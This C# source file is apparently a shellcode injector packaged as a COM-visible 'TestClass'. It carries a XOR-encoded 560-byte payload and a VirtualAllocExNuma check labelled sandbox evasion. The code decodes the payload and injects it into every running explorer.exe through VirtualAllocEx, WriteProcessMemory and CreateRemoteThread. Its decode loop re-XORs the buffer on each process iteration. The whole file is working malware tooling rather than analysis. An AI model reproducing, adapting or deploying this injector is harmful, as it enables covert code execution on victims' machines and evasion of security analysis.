using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF
    }
    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    public enum MemoryProtection
    {
        ExecuteReadWrite = 0x40
    }
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    static bool IsElevated
    {
        get
        {
            return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        }
    }
    public TestClass()
    {
        //Sandbox Evasion
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }
        //put XOR code here
        byte[] buf = new byte[560] {
0x11, 0xdd, 0xa1, 0xa9, 0xa5, 0x4a, 0x0f, 0x06, 0x54, 0x8f, 0x07, 0xad, 0xa3, 0xa9, 0xa4, 0x70, 0xfc, 0xca, 0xfd, 0xb2, 0x05, 0x3d, 0xb2, 0x05, 0x3c, 0x9c, 0x7b, 0xc5, 0x21, 0x85, 0x8e, 0xfd, 0x7a, 0xc4, 0x0f, 0x8f, 0x10, 0x11, 0x1c, 0x05, 0x1b, 0x12, 0x2e, 0x05, 0x05, 0x05, 0xe9, 0x0f, 0x15, 0xa1, 0x6a, 0x0d, 0x19, 0x01, 0x25, 0xe9, 0xe9, 0xe9, 0xa8, 0xb8, 0xa8, 0xb9, 0xbb, 0xa1, 0xd8, 0x3b, 0xb8, 0xbf, 0x8c, 0xa1, 0x62, 0xbb, 0x89, 0xa1, 0x62, 0xbb, 0xf1, 0xa1, 0x62, 0xbb, 0xc9, 0xa1, 0x62, 0x9b, 0xb9, 0xa1, 0xe6, 0x5e, 0xa3, 0xa3, 0xa4, 0xd8, 0x20, 0xa1, 0xd8, 0x29, 0x45, 0xd5, 0x88, 0x95, 0xeb, 0xc5, 0xc9, 0xa8, 0x28, 0x20, 0xe4, 0xa8, 0xe8, 0x28, 0x0b, 0x04, 0xbb, 0xa8, 0xb8, 0xa1, 0x62, 0xbb, 0xc9, 0x62, 0xab, 0xd5, 0xa1, 0xe8, 0x39, 0x8f, 0x68, 0x91, 0xf1, 0xe2, 0xeb, 0xe6, 0x6c, 0x9b, 0xe9, 0xe9, 0xe9, 0x62, 0x69, 0x61, 0xe9, 0xe9, 0xe9, 0xa1, 0x6c, 0x29, 0x9d, 0x8e, 0xa1, 0xe8, 0x39, 0xad, 0x62, 0xa9, 0xc9, 0xb9, 0x62, 0xa1, 0xf1, 0xa0, 0xe8, 0x39, 0x0a, 0xbf, 0xa4, 0xd8, 0x20, 0xa1, 0x16, 0x20, 0xa8, 0x62, 0xdd, 0x61, 0xa1, 0xe8, 0x3f, 0xa1, 0xd8, 0x29, 0xa8, 0x28, 0x20, 0xe4, 0x45, 0xa8, 0xe8, 0x28, 0xd1, 0x09, 0x9c, 0x18, 0xa5, 0xea, 0xa5, 0xcd, 0xe1, 0xac, 0xd0, 0x38, 0x9c, 0x31, 0xb1, 0xad, 0x62, 0xa9, 0xcd, 0xa0, 0xe8, 0x39, 0x8f, 0xa8, 0x62, 0xe5, 0xa1, 0xad, 0x62, 0xa9, 0xf5, 0xa0, 0xe8, 0x39, 0xa8, 0x62, 0xed, 0x61, 0xa8, 0xb1, 0xa8, 0xb1, 0xa1, 0xe8, 0x39, 0xb7, 0xb0, 0xb3, 0xa8, 0xb1, 0xa8, 0xb0, 0xa8, 0xb3, 0xa1, 0x6a, 0x05, 0xc9, 0xa8, 0xbb, 0x16, 0x09, 0xb1, 0xa8, 0xb0, 0xb3, 0xa1, 0x62, 0xfb, 0x00, 0xa2, 0x16, 0x16, 0x16, 0xb4, 0xa0, 0x57, 0x9e, 0x9a, 0xdb, 0xb6, 0xda, 0xdb, 0xe9, 0xe9, 0xa8, 0xbf, 0xa0, 0x60, 0x0f, 0xa1, 0x68, 0x05, 0x49, 0xe8, 0xe9, 0xe9, 0xa0, 0x60, 0x0c, 0xa0, 0x55, 0xeb, 0xe9, 0xe8, 0x52, 0x29, 0x41, 0xc4, 0x55, 0xa8, 0xbd, 0xa0, 0x60, 0x0d, 0xa5, 0x60, 0x18, 0xa8, 0x53, 0xa5, 0x9e, 0xcf, 0xee, 0x16, 0x3c, 0xa5, 0x60, 0x03, 0x81, 0xe8, 0xe8, 0xe9, 0xe9, 0xb0, 0xa8, 0x53, 0xc0, 0x69, 0x82, 0xe9, 0x16, 0x3c, 0x83, 0xe3, 0xa8, 0xb7, 0xb9, 0xb9, 0xa4, 0xd8, 0x20, 0xa4, 0xd8, 0x29, 0xa1, 0x16, 0x29, 0xa1, 0x60, 0x2b, 0xa1, 0x16, 0x29, 0xa1, 0x60, 0x28, 0xa8, 0x53, 0x03, 0xe6, 0x36, 0x09, 0x16, 0x3c, 0xa1, 0x60, 0x2e, 0x83, 0xf9, 0xa8, 0xb1, 0xa5, 0x60, 0x0b, 0xa1, 0x60, 0x10, 0xa8, 0x53, 0x70, 0x4c, 0x9d, 0x88, 0x16, 0x3c, 0x6c, 0x29, 0x9d, 0xe3, 0xa0, 0x16, 0x27, 0x9c, 0x0c, 0x01, 0x7a, 0xe9, 0xe9, 0xe9, 0xa1, 0x6a, 0x05, 0xf9, 0xa1, 0x60, 0x0b, 0xa4, 0xd8, 0x20, 0x83, 0xed, 0xa8, 0xb1, 0xa1, 0x60, 0x10, 0xa8, 0x53, 0xeb, 0x30, 0x21, 0xb6, 0x16, 0x3c, 0x6a, 0x11, 0xe9, 0x97, 0xbc, 0xa1, 0x6a, 0x2d, 0xc9, 0xb7, 0x60, 0x1f, 0x83, 0xa9, 0xa8, 0xb0, 0x81, 0xe9, 0xf9, 0xe9, 0xe9, 0xa8, 0xb1, 0xa1, 0x60, 0x1b, 0xa1, 0xd8, 0x20, 0xa8, 0x53, 0xb1, 0x4d, 0xba, 0x0c, 0x16, 0x3c, 0xa1, 0x60, 0x2a, 0xa0, 0x60, 0x2e, 0xa4, 0xd8, 0x20, 0xa0, 0x60, 0x19, 0xa1, 0x60, 0x33, 0xa1, 0x60, 0x10, 0xa8, 0x53, 0xeb, 0x30, 0x21, 0xb6, 0x16, 0x3c, 0x6a, 0x11, 0xe9, 0x94, 0xc1, 0xb1, 0xa8, 0xbe, 0xb0, 0x81, 0xe9, 0xa9, 0xe9, 0xe9, 0xa8, 0xb1, 0x83, 0xe9, 0xb3, 0xa8, 0x53, 0xe2, 0xc6, 0xe6, 0xd9, 0x16, 0x3c, 0xbe, 0xb0, 0xa8, 0x53, 0x9c, 0x87, 0xa4, 0x88, 0x16, 0x3c, 0xa0, 0x16, 0x27, 0x00, 0xd5, 0x16, 0x16, 0x16, 0xa1, 0xe8, 0x2a, 0xa1, 0xc0, 0x2f, 0xa1, 0x6c, 0x1f, 0x9c, 0x5d, 0xa8, 0x16, 0x0e, 0xb1, 0x83, 0xe9, 0xb0, 0xa0, 0x2e, 0x2b, 0x19, 0x5c, 0x4b, 0xbf, 0x16, 0x3c, 0x21, 0x85
};


        int size = buf.Length;

        Process[] expProc = Process.GetProcessesByName("explorer");

        for (int i = 0; i < expProc.Length; i++)
        {
            int pid = expProc[i].Id;

            // Get a handle on the process
            IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);

            IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

            for (int j = 0; j < buf.Length; j++)
            {
                buf[j] = (byte)((uint)buf[j] ^ 0xfa);
            }

            IntPtr bytesWritten;
            bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, size, out bytesWritten);

            IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

